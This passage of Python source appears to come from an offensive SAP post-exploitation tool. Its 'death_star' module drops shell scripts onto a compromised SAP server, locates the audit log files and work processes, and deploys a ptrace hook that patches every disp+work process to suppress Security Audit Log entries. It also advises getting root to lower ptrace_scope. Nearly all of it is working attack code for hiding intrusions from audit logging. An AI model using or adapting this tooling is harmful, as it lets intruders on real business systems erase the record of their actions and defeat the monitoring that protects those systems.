    # some distros — fall back to plain ``ls -1t`` for those).
    script = (
        "#!/bin/sh\n"
        f"SID={sid}\n"
        # Primary: find under /usr/sap/<SID>/*/log/*.AUD
        "PATHS=`find /usr/sap/$SID -maxdepth 4 -type f -name '*.AUD' "
        "-printf '%T@ %p\\n' 2>/dev/null | sort -rn | head -1 "
        "| awk '{print $2}'`\n"
        "if [ -z \"$PATHS\" ]; then\n"
        # Fallback for busybox-find (no -printf).  ls -1t sorts by
        # mtime descending; find with -exec ls would be simpler but
        # SXPG params can't have shell metacharacters, and busybox
        # ls doesn't group across dirs — hence the loop.
        "  for d in /usr/sap/$SID/*/log; do\n"
        "    [ -d \"$d\" ] || continue\n"
        "    f=`ls -1t \"$d\"/*.AUD 2>/dev/null | head -1`\n"
        "    if [ -n \"$f\" ]; then\n"
        "      PATHS=\"$f\"\n"
        "      break\n"
        "    fi\n"
        "  done\n"
        "fi\n"
        "if [ -n \"$PATHS\" ]; then\n"
        "  echo AUDIT_FILE: $PATHS\n"
        "else\n"
        "  echo AUDIT_FILE: (none)\n"
        "fi\n"
    )
    try:
        _write_remote_file(node, scratch_sh, script.encode("utf-8"),
                            label=f"drop audit-file probe → {scratch_sh}")
    except DeathStarError as e:
        print(f"[!] {node.sid}: death_star: could not drop audit-file "
               f"probe: {e}")
        return None

    r = _run(node, "sh", scratch_sh, label="probe for SAP audit file")
    _run(node, "/bin/rm", f"-f {scratch_sh}",
          label="cleanup audit-file probe")

    for line in r.get("output") or []:
        s = line.strip()
        if s.startswith("AUDIT_FILE:"):
            path = s[len("AUDIT_FILE:"):].strip()
            if path and path != "(none)":
                print(f"[*] {node.sid}: death_star: discovered SAL file "
                       f"→ {path}")
                return path
    print(f"[*] {node.sid}: death_star: no SAL .AUD file found under "
           f"/usr/sap/{sid}/*/log — target may be DB-recording only "
           f"(hook runs without --audit-file)")
    return None


def _find_workers_via_proc(node,
                              remote_dir: str = DEFAULT_REMOTE_DIR
                              ) -> tuple[list, list]:
    """Enumerate SAP work-processes by walking ``/proc/[0-9]*/comm``.

    Drops a small script (SXPG-safe file-drop pattern) that iterates
    /proc entries and prints ``pid comm`` for every process whose
    comm matches a SAP work-process pattern.  We then classify with
    the same ``_classify_worker`` helper used for the ps path so both
    discovery routes agree on what counts as a dialog worker vs a
    non-dialog fallback.

    Returns ``(workers, fallbacks)`` lists of ``(pid, comm)`` tuples.
    Empty lists when nothing matches — caller decides what to do.
    """
    scratch_sh = (f"{remote_dir.rstrip('/')}/"
                    f"sapmap_ds_procwalk_{_rand_suffix()}.sh")
    # POSIX sh — no bash-isms.  ``for f in /proc/[0-9]*`` uses glob
    # expansion; ``basename`` strips the /proc/ prefix to get the PID.
    # ``2>/dev/null`` swallows the "No such file" errors from processes
    # that exit between the glob and the read.
    script = (
        "#!/bin/sh\n"
        "for p in /proc/[0-9]*; do\n"
        "  if [ ! -r \"$p/comm\" ]; then continue; fi\n"
        "  comm=`cat \"$p/comm\" 2>/dev/null`\n"
        "  case \"$comm\" in\n"
        # Modern SAP kernel: SAP_<SID>_<inst>_<TYPE>.
        "    SAP_*_W*|SAP_*_BTC|SAP_*_SPO|SAP_*_UP2|SAP_*_UPD|SAP_*_DP)\n"
        "      pid=`basename \"$p\"`\n"
        "      echo \"$pid $comm\"\n"
        "      ;;\n"
        # Legacy SAP kernel: comm is literally ``disp+work``.
        "    'disp+work'|dw.sap*)\n"
        "      pid=`basename \"$p\"`\n"
        "      echo \"$pid $comm\"\n"
        "      ;;\n"
        "  esac\n"
        "done\n"
    )

    try:
        _write_remote_file(node, scratch_sh, script.encode("utf-8"),
                            label=f"drop /proc walker → {scratch_sh}")
    except DeathStarError as e:
        print(f"[!] {node.sid}: death_star: could not drop /proc "
               f"walker: {e}")
        return [], []

    r = _run(node, "sh", scratch_sh, label="walk /proc for SAP processes")
    _run(node, "/bin/rm", f"-f {scratch_sh}",
          label="cleanup /proc walker")

    workers, fallbacks = [], []
    for line in r.get("output") or []:
        parts = line.strip().split(None, 1)
        if len(parts) != 2:
            continue
        try:
            pid = int(parts[0])
        except ValueError:
            continue
        comm = parts[1]
        klass = _classify_worker(comm)
        if klass == "worker":
            workers.append((pid, comm))
        elif klass == "fallback":
            fallbacks.append((pid, comm))

    print(f"[*] {node.sid}: death_star: /proc walk found "
           f"{len(workers)} worker(s) + {len(fallbacks)} fallback(s)")
    return workers, fallbacks


# ---------------------------------------------------------------------------
# Launch
# ---------------------------------------------------------------------------

def launch(node, binary_path: str,
             target_pid: Optional[int] = None,
             filter_classes: str = "", verbose: bool = False,
             log_path: Optional[str] = None,
             pidfile_path: Optional[str] = None,
             audit_file: Optional[str] = None,
             remote_dir: str = DEFAULT_REMOTE_DIR) -> int:
    """Launch the hook in ``--suppress`` mode, detached from the
    operator's SXPG session so it survives after the RFC round-trip
    completes.

    ``target_pid`` semantics:

      * ``None`` (default and strongly recommended) — launch WITHOUT
        ``--pid``.  Julian's C hook's ``find_pids()`` scans /proc,
        finds every ``disp+work`` / ``dw.sap<SID>_<inst>`` process,
        skips the dispatcher via ``is_work_process()``, and attaches
        to ALL work-processes.  Necessary because SAP dispatches
        dialog sessions across the full worker pool — hooking only
        one worker leaves audit events on the other N-1 unhooked.
        This is what an operator normally wants.

      * ``<int>`` — force a single worker PID (only useful for
        debugging or targeted attacks against a known logon session).
        Passes ``--pid <pid>`` to the hook.

    Because the launch needs shell control-flow (``if`` for the
    previous-instance kill, ``&`` for backgrounding, ``$!`` for the
    launched PID), we drop a launcher script to ``/tmp`` first via the
    SXPG-safe chunked-write helper, then execute it with the two-token
    argv ``sh /tmp/<launcher>.sh`` — no ``-c``, no quoting, no
    metacharacters to mangle.

    Returns the launched hook's PID.  Raises ``DeathStarError`` if the
    process didn't come up (e.g. ptrace_scope > 1, or the target PID
    already exited).
    """
    if log_path is None:
        log_path = f"{remote_dir.rstrip('/')}/{DEFAULT_LOG_NAME}"
    if pidfile_path is None:
        pidfile_path = f"{remote_dir.rstrip('/')}/{DEFAULT_PIDFILE_NAME}"

    # Compose the hook command line.  Shell-safe: our filter comes from
    # the operator, so we validate it here rather than trusting shell
    # escaping (which we're avoiding entirely).  SAL event classes are
    # 3 chars: two upper letters + one alnum, comma-separated.
    cls_str = filter_classes.strip()
    if cls_str and not re.fullmatch(r"[A-Z0-9,]+", cls_str):
        raise DeathStarError(
            f"invalid filter_classes {cls_str!r}: expected uppercase "
            "letters/digits/commas only (e.g. 'AUW' or 'AUW,AU3')")
    args = [binary_path, "--suppress"]
    if target_pid is not None:
        args.extend(["--pid", str(target_pid)])
    if cls_str:
        args.extend(["--filter", cls_str])
    # ``--audit-file`` overrides the C hook's ``find_audit_file()``
    # symbol-scan, which is Build-A-only and comes up empty on modern
    # SUSE-built kernels (e.g. 793 on S/4HANA 2023).  Absent the flag,
    # the hook only suppresses DB writes; the file-based SAL sink
    # keeps recording.  We validate the path here — SAP audit files
    # live under /usr/sap/<SID>/<INST>/log and are all named .AUD.
    if audit_file:
        if not re.fullmatch(r"[A-Za-z0-9_/.\-]+", audit_file):
            raise DeathStarError(
                f"invalid audit_file {audit_file!r}: expected a plain "
                "POSIX path — no shell metacharacters allowed")
        args.extend(["--audit-file", audit_file])
    if verbose:
        args.append("-v")
    hook_cmdline = " ".join(args)

    scratch_sh = (f"{remote_dir.rstrip('/')}/"
                    f"sapmap_ds_launch_{_rand_suffix()}.sh")
    # POSIX sh script — safe on every SAP host (all use bash for
    # ``<sid>adm`` login, but /bin/sh symlinks to dash on Debian/Ubuntu
    # and to bash elsewhere).  Uses only POSIX constructs.
    #
    #   * If a previous pidfile exists, best-effort kill the old hook so
    #     the operator can re-arm without leaving orphan INT3s.
    #   * ``setsid`` + ``&`` gives us a session-detached background
    #     process; the operator's SXPG session teardown doesn't reap it.
    #   * ``$!`` is the last backgrounded PID → written to pidfile so
    #     ``stop()`` can find it.
    script = (
        f"#!/bin/sh\n"
        # Pre-exec diagnostics — surface binary state before we try
        # to run it.  Previous launches silently failed when nohup
        # returned ENOENT; these lines give the operator hard evidence
        # of what's on disk (or not).
        f"echo DIAG: binary check — ls -la {binary_path}\n"
        f"ls -la {binary_path} 2>&1\n"
        f"if [ ! -f {binary_path} ]; then\n"
        f"  echo STATUS: MISSING {binary_path}\n"
        f"  exit 0\n"
        f"fi\n"
        f"if [ ! -x {binary_path} ]; then\n"
        f"  echo DIAG: binary exists but is not executable\n"
        f"  echo STATUS: NOT_EXECUTABLE {binary_path}\n"
        f"  exit 0\n"
        f"fi\n"
        # Best-effort cleanup of any prior instance.  Same PID sanity
        # checks as stop(): a stale pidfile might contain "2" or a
        # kernel PID; killing that would either fail (kernel threads
        # ignore SIGTERM from userspace) or hit an innocent recycled
        # PID.  Validate before signaling.
        f"if [ -s {pidfile_path} ]; then\n"
        f"  OLD=`cat {pidfile_path} 2>/dev/null`\n"
        f"  case \"$OLD\" in\n"
        f"    ''|*[!0-9]*) OLD= ;;\n"
        f"  esac\n"
        f"  if [ -n \"$OLD\" ] && [ \"$OLD\" -ge 100 ] "
        f"&& [ -r /proc/$OLD/comm ]; then\n"
        f"    OLDCOMM=`cat /proc/$OLD/comm 2>/dev/null`\n"
        f"    case \"$OLDCOMM\" in\n"
        f"      sap_audit_hook*)\n"
        f"        kill -TERM $OLD 2>/dev/null\n"
        f"        ;;\n"
        f"    esac\n"
        f"  fi\n"
        f"  rm -f {pidfile_path}\n"
        f"fi\n"
        # Launch detached via a subshell with exec-level redirects.
        # Previous approach (``setsid cmd >> log 2>&1 &``) produced a
        # 0-byte log on SUSE SLES despite the hook being alive and
        # attached — the shell-level redirect was not inherited by the
        # setsid child on some systemd mount-namespace configurations
        # (PrivateTmp).  The subshell form ``(exec >> log 2>&1; setsid
        # cmd &)`` forces the redirect onto the subshell's own FD
        # table BEFORE setsid forks, guaranteeing the hook inherits
        # the open file descriptor.  ``exec`` without a command
        # applies the redirects to the current shell; the subsequent
        # ``setsid cmd &`` then runs with those FDs already in place.
        f"(\n"
        f"  exec >> {log_path} 2>&1\n"
        f"  exec < /dev/null\n"
        f"  setsid {hook_cmdline} &\n"
        f"  echo $! > {pidfile_path}\n"
        f") &\n"
        # The outer & backgrounds the subshell; wait a moment then
        # read the pidfile to discover the hook PID.
        f"sleep 2\n"
        f"if [ ! -s {pidfile_path} ]; then\n"
        f"  echo STATUS: NO_PIDFILE\n"
        f"  echo DIAG: launcher subshell did not write pidfile\n"
        f"  exit 0\n"
        f"fi\n"
        f"NEW=`cat {pidfile_path}`\n"
        # The 2s sleep above gives the hook time to ptrace-attach,
        # plant INT3s, and PTRACE_CONT all workers.  If ptrace_scope
        # > 1 or targets are invalid, the hook will have died.
        f"if kill -0 $NEW 2>/dev/null; then\n"
        f"  echo STATUS: ALIVE $NEW\n"
        f"else\n"
        f"  echo STATUS: DIED $NEW\n"
        f"  echo DIAG: hook process exited within 1s — check "
        f"{log_path} for ptrace_scope/attach errors\n"
        f"  rm -f {pidfile_path}\n"
        f"fi\n"
    )

    _write_remote_file(node, scratch_sh, script.encode("utf-8"),
                        label=f"drop launcher → {scratch_sh}")

    # Run the launcher.  Two-token argv: `sh /tmp/sapmap_ds_launch_xxx.sh`.
    r = _run(node, "sh", scratch_sh,
              label=(f"launch --suppress"
                      + (f" --filter {cls_str}" if cls_str
                         else " (all classes)")
                      + f" --pid {target_pid}"))
    # Cleanup the launcher script; non-fatal.
    _run(node, "/bin/rm", f"-f {scratch_sh}",
          label="cleanup launcher")

    if not r.get("success"):
        raise DeathStarError(
            f"launch failed: {r.get('error') or 'unknown'}")

    # Emit DIAG lines to the operator's console — same pattern as
    # stop(), so a ptrace-scope-denied launch surfaces its "check log
    # file" hint instead of a bare "hook died" mystery.
    lines = r.get("output") or []
    for ln in lines:
        s = ln.strip()
        if s.startswith("DIAG:"):
            print(f"[*] {node.sid}: death_star:   {s}")

    # Look for a tagged STATUS line — same discipline as stop() so DIAG
    # lines don't accidentally get parsed as PIDs.
    status = ""
    for ln in lines:
        s = ln.strip()
        if s.startswith("STATUS:"):
            status = s[len("STATUS:"):].strip()
            break
    if not status:
        # Fallback — some SXPG/SAPControl backends swallow the parent
        # shell's stdout when it forks a setsid-detached child (pipe
        # bookkeeping bug on the sapstartsrv/sapxpg side, empirically
        # observed on S/4HANA hosts running SUSE kernels).  The
        # launcher writes the hook PID to pidfile_path BEFORE it
        # echoes STATUS, so the pidfile is authoritative even when
        # stdout is lost.  Read it back with a separate exec and
        # verify the hook is alive.
        print(f"[!] {node.sid}: death_star: launcher stdout empty — "
               f"falling back to pidfile check at {pidfile_path}")
        _pf = _run(node, "cat", pidfile_path,
                    label=f"read pidfile — {pidfile_path}")
        _pid_lines = [l.strip() for l in (_pf.get("output") or [])
                        if l.strip()]
        _pid_str = _pid_lines[0] if _pid_lines else ""
        if not _pid_str.isdigit():
            raise DeathStarError(
                f"launch produced no STATUS line AND pidfile "
                f"{pidfile_path} was empty/unreadable — likely the "
                f"launcher script itself never ran.  Check "
                f"{log_path} on the target.")
        _pid_int = int(_pid_str)
        # Read /proc/PID/comm — SXPG-safe two-token argv, no shell
        # quoting needed.  Alive → comm printed (e.g. "sap_audit_hook").
        # Dead → cat errors "No such file" into the LOG table.
        _alive = _run(node, "/bin/cat",
                       f"/proc/{_pid_int}/comm",
                       label=f"verify hook alive — /proc/{_pid_int}/comm")
        _av_out = " ".join(str(l) for l in
                             (_alive.get("output") or [])).lower()
        if ("sap_audit_hook" in _av_out
                or ("no such" not in _av_out
                    and _av_out.strip() != "")):
            status = f"ALIVE {_pid_int}"
            print(f"[+] {node.sid}: death_star: pidfile-based verify "
                   f"confirms hook running as PID {_pid_int}")
        else:
            raise DeathStarError(
                f"launch produced no STATUS line AND the pidfile PID "
                f"{_pid_int} is not alive (/proc/{_pid_int}/comm: "
                f"{_av_out[:100]!r}) — hook died before we could "
                f"verify.  Check {log_path} on the target.")
    if status.startswith("NO_PIDFILE"):
        raise DeathStarError(
            f"launcher subshell did not write the pidfile after 2 s — "
            f"the setsid launch may have failed silently.  Check "
            f"{log_path} on the target for ptrace errors.")
    if status.startswith("MISSING"):
        raise DeathStarError(
            f"binary not found at launch time — the upload succeeded "
            f"but the file vanished before the launcher ran.  Likely "
            f"cause: /tmp cleanup (systemd-tmpfiles, tmpreaper) or a "
            f"security module.  Try a persistent path like "
            f"/usr/sap/tmp/ or /home/<sid>adm/.")
    if status.startswith("NOT_EXECUTABLE"):
        raise DeathStarError(
            f"binary exists but is not executable — chmod +x reported "
            f"success but the execute bit is not set.  Likely cause: "
            f"/tmp mounted with noexec.  Try a persistent path like "
            f"/usr/sap/tmp/ or /home/<sid>adm/.")
    if status.startswith("DIED"):
        raise DeathStarError(
            "hook process exited within 1 s of launch — likely "
            "kernel.yama.ptrace_scope > 1 (check with "
            "'sysctl kernel.yama.ptrace_scope' on the target) or the "
            "target PID is invalid.  Full hook log: " + log_path)
    if not status.startswith("ALIVE"):
        raise DeathStarError(
            f"unexpected launch STATUS: {status!r}")
    try:
        hook_pid = int(status.split()[-1])
    except (IndexError, ValueError):
        raise DeathStarError(
            f"could not parse hook PID from STATUS: {status!r}")
    print(f"[+] {node.sid}: death_star: hook running as PID {hook_pid} "
           f"(log: {log_path})")
    return hook_pid


# ---------------------------------------------------------------------------
# Stop
# ---------------------------------------------------------------------------

def stop(node, pidfile_path: Optional[str] = None,
          binary_path: Optional[str] = None,
          remote_dir: str = DEFAULT_REMOTE_DIR) -> dict:
    """Send SIGTERM to the running hook.  The hook's SIGTERM handler
    (``sig_handler``) drops out of the main loop and calls
    ``detach_all()`` which restores every INT3 byte before releasing
    ptrace — a hard-kill (SIGKILL) would leave the disp+work bytes
    patched, so we never use it.

    Same file-drop pattern as ``launch``: the stop logic has ``if``,
    ``pgrep``, and a bounded wait loop that don't fit in one SXPG-safe
    argv, so we drop a stopper script and run ``sh <path>``.

    Returns ``{ok, pid, message}``.  ``ok=False`` when no pidfile or
    the process wasn't running.  Never raises — cleanup should be
    tolerant to concurrent state (operator may have kill'd it by
    hand already).
    """
    if pidfile_path is None:
        pidfile_path = f"{remote_dir.rstrip('/')}/{DEFAULT_PIDFILE_NAME}"
    if binary_path is None:
        binary_path = f"{remote_dir.rstrip('/')}/{DEFAULT_BINARY_NAME}"

    scratch_sh = (f"{remote_dir.rstrip('/')}/"
                    f"sapmap_ds_stop_{_rand_suffix()}.sh")
    # POSIX sh — best-effort: try the pidfile first, fall back to
    # ``pgrep -f`` on the binary path when the pidfile is missing or
    # empty (operator may have rebooted the SAPMAP host mid-run).
    #
    # Defensive PID validation before signaling — operator report:
    # stopper found "PID 2" (kthreadd) in the pidfile and tried to
    # SIGTERM it, wasted 6 s on a wait loop that could never succeed.
    # Sources of a bad PID:
    #   * Stale pidfile from an earlier crashed launch (echo $! with
    #     $! unset gives a blank line, but partial writes can happen)
    #   * pgrep matching itself or the parent SXPG shell if their
    #     cmdline happens to include the binary path substring
    #   * Kernel PID recycling on a long-running host (unlikely to
    #     land on 2, but not impossible)
    #
    # Every check emits a tagged ``DIAG:`` line so operators can see
    # what went wrong.  Parser filters on ``STATUS:`` first-tokens so
    # DIAG lines don't accidentally get parsed as PID values.
    script = (
        f"#!/bin/sh\n"
        f"PID=\n"
        f"SRC=none\n"
        f"if [ -s {pidfile_path} ]; then\n"
        f"  PID=`cat {pidfile_path} 2>/dev/null`\n"
        f"  SRC=pidfile\n"
        f"  echo DIAG: pidfile={pidfile_path} contents=[$PID]\n"
        f"else\n"
        f"  echo DIAG: pidfile={pidfile_path} not-present\n"
        f"fi\n"
        f"if [ -z \"$PID\" ]; then\n"
        f"  PID=`pgrep -f {binary_path} 2>/dev/null | head -1`\n"
        f"  SRC=pgrep\n"
        f"  echo DIAG: pgrep-fallback pid=[$PID]\n"
        f"fi\n"
        f"if [ -z \"$PID\" ]; then\n"
        f"  echo STATUS: NOT_RUNNING\n"
        f"  exit 0\n"
        f"fi\n"
        # PID must be a decimal integer — anything else is corruption.
        # POSIX case-glob is portable; `expr` / `-eq` would error out.
        f"case \"$PID\" in\n"
        f"  ''|*[!0-9]*)\n"
        f"    echo DIAG: stale-pid-not-integer src=$SRC value=[$PID]\n"
        f"    rm -f {pidfile_path}\n"
        f"    echo STATUS: NOT_RUNNING\n"
        f"    exit 0\n"
        f"    ;;\n"
        f"esac\n"
        # PID < 100 = kernel-owned process (kthreadd, init, workqueues).
        # Real SAP work-processes are always well above that.  Signalling
        # PID 2 is the exact failure mode we're patching around.
        f"if [ \"$PID\" -lt 100 ]; then\n"
        f"  echo DIAG: stale-pid-too-low src=$SRC pid=$PID\n"
        f"  rm -f {pidfile_path}\n"
        f"  echo STATUS: NOT_RUNNING\n"
        f"  exit 0\n"
        f"fi\n"
        # PID must reference a live process.  /proc/<pid>/ existing is
        # authoritative on Linux.
        f"if [ ! -d /proc/$PID ]; then\n"
        f"  echo DIAG: pid-not-alive src=$SRC pid=$PID\n"
        f"  rm -f {pidfile_path}\n"
        f"  echo STATUS: NOT_RUNNING\n"
        f"  exit 0\n"
        f"fi\n"
        # And the process must actually BE our hook.  /proc/<pid>/comm
        # is truncated at TASK_COMM_LEN-1 = 15 chars; "sap_audit_hook"
        # (14) fits.  If comm doesn't match, we're looking at a
        # recycled PID or misplaced pidfile — do not touch it.
        f"COMM=\n"
        f"if [ -r /proc/$PID/comm ]; then\n"
        f"  COMM=`cat /proc/$PID/comm 2>/dev/null`\n"
        f"fi\n"
        f"case \"$COMM\" in\n"
        f"  sap_audit_hook*) : ;;\n"
        f"  *)\n"
        f"    echo DIAG: wrong-process src=$SRC pid=$PID comm=[$COMM]\n"
        f"    rm -f {pidfile_path}\n"
        f"    echo STATUS: NOT_RUNNING\n"
        f"    exit 0\n"
        f"    ;;\n"
        f"esac\n"
        # All sanity checks passed — signal the hook and wait for its
        # SIGTERM handler to run detach_all() + restore INT3 bytes.
        f"echo DIAG: sending SIGTERM src=$SRC pid=$PID comm=$COMM\n"
        f"kill -TERM $PID 2>/dev/null\n"
        f"i=0\n"
        f"while [ $i -lt 6 ]; do\n"
        f"  if ! kill -0 $PID 2>/dev/null; then break; fi\n"
        f"  sleep 1\n"
        f"  i=`expr $i + 1`\n"
        f"done\n"
        f"if kill -0 $PID 2>/dev/null; then\n"
        f"  echo STATUS: STILL_RUNNING $PID\n"
        f"else\n"
        f"  echo STATUS: STOPPED $PID\n"
        f"  rm -f {pidfile_path}\n"
        f"fi\n"
    )

    try:
        _write_remote_file(node, scratch_sh, script.encode("utf-8"),
                            label=f"drop stopper → {scratch_sh}")
    except DeathStarError as e:
        return {"ok": False, "pid": None,
                "message": f"could not drop stopper script: {e}"}

    r = _run(node, "sh", scratch_sh,
              label=f"SIGTERM hook (pidfile {pidfile_path})")
    _run(node, "/bin/rm", f"-f {scratch_sh}",
          label="cleanup stopper")

    # Emit every DIAG line to the operator's console so the failure
    # mode (bad pidfile, wrong process, kernel PID) is visible.
    lines = r.get("output") or []
    for ln in lines:
        s = ln.strip()
        if s.startswith("DIAG:"):
            print(f"[*] {node.sid}: death_star:   {s}")

    # Parse only STATUS lines — DIAG lines contain digits that would
    # otherwise get mis-parsed as PID values by ``split()[-1]``.
    status = ""
    for ln in lines:
        s = ln.strip()
        if s.startswith("STATUS:"):
            status = s[len("STATUS:"):].strip()
            break

    if not r.get("success"):
        return {"ok": False, "pid": None,
                "message": f"stopper script failed: "
                           f"{r.get('error') or status or 'unknown'}"}
    if not status:
        # No STATUS line at all → script exited before printing one
        # (syntax error, sh missing, etc).  Surface raw output.
        joined = " ".join(lines).strip()
        return {"ok": False, "pid": None,
                "message": f"stopper produced no STATUS line; raw "
                           f"output: {joined[:200]!r}"}
    if status.startswith("NOT_RUNNING"):
        return {"ok": False, "pid": None,
                "message": "no hook process found — nothing to stop"}
    if status.startswith("STOPPED"):
        try:
            pid = int(status.split()[-1])
        except (IndexError, ValueError):
            pid = None
        print(f"[+] {node.sid}: death_star: hook PID {pid} stopped "
               f"(INT3 bytes restored, ptrace detached)")
        return {"ok": True, "pid": pid, "message": "stopped cleanly"}
    if status.startswith("STILL_RUNNING"):
        try:
            pid = int(status.split()[-1])
        except (IndexError, ValueError):
            pid = None
        print(f"[!] {node.sid}: death_star: hook PID {pid} did not exit "
               f"within 6 s — operator may need to check manually")
        return {"ok": False, "pid": pid,
                "message": "SIGTERM sent but hook did not exit within 6 s"}
    return {"ok": False, "pid": None,
            "message": f"unexpected STATUS: {status!r}"}


# ---------------------------------------------------------------------------
# End-to-end
# ---------------------------------------------------------------------------

def read_hook_log(node, log_path: str,
                    max_lines: int = 100) -> list[str]:
    """Fetch the last ``max_lines`` lines of ``/tmp/sap_audit_hook.log``.

    Returns a list of stripped lines (empty list on any failure).
    Never raises — this is a diagnostic helper the caller invokes to
    surface hook startup messages / plant errors to the operator's
    console, and it must not derail the arm flow when the log is
    empty or unreadable.
    """
    r = _run(node, "tail", f"-n {int(max_lines)} {log_path}",
              label=f"read hook log ({log_path})")
    if not r.get("success"):
        return []
    return [ln.rstrip() for ln in (r.get("output") or []) if ln.strip()]


def deploy_and_launch(node, filter_classes: str = "",
                        remote_dir: str = DEFAULT_REMOTE_DIR,
                        target_pid: Optional[int] = None,
                        skip_upload: bool = False,
                        skip_compile: bool = False,
                        force_source: bool = False,
                        verbose: bool = True) -> dict:
    """Full pipeline: upload → (compile) → find worker → launch.

    Two deployment paths, auto-selected in this order:

    1. **Pre-built binary path** (preferred when
       ``modules/postex/vendor/sap_audit_hook.linux-x86_64`` exists):
       upload the vendored binary → chmod +x → verify → launch.
       No compiler needed on the target — the deployment path for
       hardened SAP application servers.

    2. **Compile-on-target path**: upload ``sap_audit_hook.c`` →
       gcc/cc/clang → launch.  Fallback for arch mismatches or when
       the vendored binary is intentionally omitted.

    ``force_source=True`` forces path 2 even when the pre-built binary
    is present — for operators who want to inspect and rebuild the
    source themselves.

    Returns::

        {
          ok, source_path, binary_path, target_pid, target_comm,
          hook_pid, log_path, pidfile_path, filter_classes, mode,
        }

    ``mode`` is ``"prebuilt"`` or ``"compile"`` so the operator can
    tell after the fact which deployment path was used.

    Raises ``DeathStarError`` on any step failure; the exception message
    is human-readable and suitable for surfacing to the operator.

    Args:
      node:            SAPMAP ``SAPNode`` to deploy against.  Requires
                       Linux OS-exec capability.
      filter_classes:  Comma-separated audit-class list, e.g. ``"AUW"``
                       or ``"AUW,AU3"``.  Empty → suppress all audit
                       classes (loudest, but simplest to test).
      remote_dir:      Directory on the target for source + binary +
                       log + pidfile.  Defaults to ``/tmp`` since every
                       ``<sid>adm`` has write access there and it
                       survives long enough for the hook lifetime.
      target_pid:      Force a specific disp+work PID.  When ``None``,
                       we auto-pick the first ``_W<n>`` worker.
      skip_upload:     Reuse a previously-uploaded source (compile
                       path) or previously-uploaded binary (pre-built
                       path).  Useful for reruns during operator
                       iteration.
      skip_compile:    Compile-path only — reuse a previously-compiled
                       ``sap_audit_hook`` binary.  Ignored in
                       pre-built mode.
      force_source:    Force the compile-on-target path even when a
                       vendored pre-built binary is present.
      verbose:         Pass ``-v`` to the hook.  Turns on hook-side
                       diagnostic prints to the log file.
    """
    source_path = f"{remote_dir.rstrip('/')}/{DEFAULT_SOURCE_NAME}"
    binary_path = f"{remote_dir.rstrip('/')}/{DEFAULT_BINARY_NAME}"
    log_path = f"{remote_dir.rstrip('/')}/{DEFAULT_LOG_NAME}"
    pidfile_path = f"{remote_dir.rstrip('/')}/{DEFAULT_PIDFILE_NAME}"

    # Pre-flight: kernel.yama.ptrace_scope must be 0 for a same-uid
    # PTRACE_ATTACH from <sid>adm to succeed against the disp+work
    # pool.  Default on SUSE/RHEL/Ubuntu is 1 (only children) or 2
    # (admin only) — both refuse our attach with EPERM ("Operation
    # not permitted"), which we saw on S4H (SUSE-based S/4HANA 2023).
    # Bail out BEFORE burning ~8 minutes on the 91 KB binary upload.
    _pt = _run(node, "/bin/cat",
                "/proc/sys/kernel/yama/ptrace_scope",
                label="pre-flight: check kernel.yama.ptrace_scope")
    _pt_lines = [l.strip() for l in (_pt.get("output") or [])
                    if l.strip()]
    _pt_val = None
    if _pt_lines and _pt_lines[0].isdigit():
        _pt_val = int(_pt_lines[0])
    if _pt_val is not None and _pt_val > 0:
        raise DeathStarError(
            f"kernel.yama.ptrace_scope = {_pt_val} on the target — "
            f"PTRACE_ATTACH from <sid>adm to sibling disp+work "
            f"processes will fail with EPERM.  The hook needs "
            f"same-uid ptrace, which is only allowed when "
            f"ptrace_scope = 0.  To arm Death Star, ask a root "
            f"account on the target to run: "
            f"'echo 0 > /proc/sys/kernel/yama/ptrace_scope' "
            f"(temporary) or 'sysctl -w kernel.yama.ptrace_scope=0' "
            f"(persistent for this boot).  Rerun after that.")
    if _pt_val is None:
        # Kernel without CONFIG_SECURITY_YAMA (older / minimal
        # distros) — /proc/sys/kernel/yama/ doesn't exist and cat
        # errored "No such file".  ptrace_scope isn't enforced, so
        # same-uid attach works.  Proceed.
        print(f"[*] {node.sid}: death_star: no yama LSM on target "
               f"(ptrace_scope not enforced) — proceeding")
    else:
        print(f"[*] {node.sid}: death_star: kernel.yama.ptrace_scope "
               f"= 0 — same-uid ptrace allowed, proceeding")

    use_prebuilt = has_prebuilt_binary() and not force_source
    if use_prebuilt:
        mode = "prebuilt"
        print(f"[*] {node.sid}: death_star: using pre-built binary "
               f"(no compiler needed on target)")
        if not skip_upload:
            upload_prebuilt_binary(node,
                                     binary_path=binary_path,
                                     remote_dir=remote_dir)
        else:
            print(f"[*] {node.sid}: death_star: skip_upload — reusing "
                   f"{binary_path}")
    else:
        mode = "compile"
        if force_source:
            print(f"[*] {node.sid}: death_star: force_source=True — "
                   f"skipping pre-built binary, will compile on target")
        else:
            print(f"[*] {node.sid}: death_star: no pre-built binary "
                   f"vendored — will compile on target "
                   f"(build one with "
                   f"modules/postex/vendor/build_sap_audit_hook.sh "
                   f"to skip this)")
        if not skip_upload:
            upload_source(node, remote_dir=remote_dir)
        else:
            print(f"[*] {node.sid}: death_star: skip_upload — reusing "
                   f"{source_path}")
        if not skip_compile:
            compile_hook(node, source_path, binary_path,
                          remote_dir=remote_dir)
        else:
            print(f"[*] {node.sid}: death_star: skip_compile — reusing "
                   f"{binary_path}")

    # Worker attachment strategy:
    #
    #   * ``target_pid = None`` (default) → hook auto-attaches to ALL
    #     disp+work processes.  This is what an operator normally wants
    #     because SAP round-robins dialog sessions across the full
    #     worker pool; hooking only one worker leaves the other N-1
    #     unpatched and the corresponding SAL events still land in
    #     SM20.  Enumerate here purely for the "attached to N workers"
    #     confirmation message; the actual multi-attach happens inside
    #     Julian's ``find_pids()`` after launch.
    #
    #   * ``target_pid = <int>`` → hook attaches only to that single
    #     PID.  Reserved for debugging / targeted-session scenarios.
    workers_seen: int = 0
    if target_pid is None:
        try:
            r = _run(node, "ps", "-eo pid,comm,args --no-headers",
                      label="enumerate workers for hook message")
            ps_lines = (r.get("output") or []) if r.get("success") else []
            enum_workers, enum_fallbacks = [], []
            for line in ps_lines:
                m = _WORKER_COMM_RE.match(line.strip())
                if not m:
                    continue
                comm = m.group("comm")
                klass = _classify_worker(comm)
                if klass == "worker":
                    enum_workers.append(comm)
                elif klass == "fallback":
                    enum_fallbacks.append(comm)
            # If ps didn't give us anything, fall back to /proc walker
            # for the display count.  Same reason we do this in
            # find_worker_pid.
            if not enum_workers and not enum_fallbacks:
                w, f = _find_workers_via_proc(node, remote_dir=remote_dir)
                enum_workers = [c for _, c in w]
                enum_fallbacks = [c for _, c in f]
            workers_seen = len(enum_workers) + len(enum_fallbacks)
            target_comm = (f"(auto-attach to all {workers_seen} "
                            f"work-process(es): "
                            f"{len(enum_workers)} dialog / "
                            f"{len(enum_fallbacks)} btc+spo+up2)")
        except Exception as e:
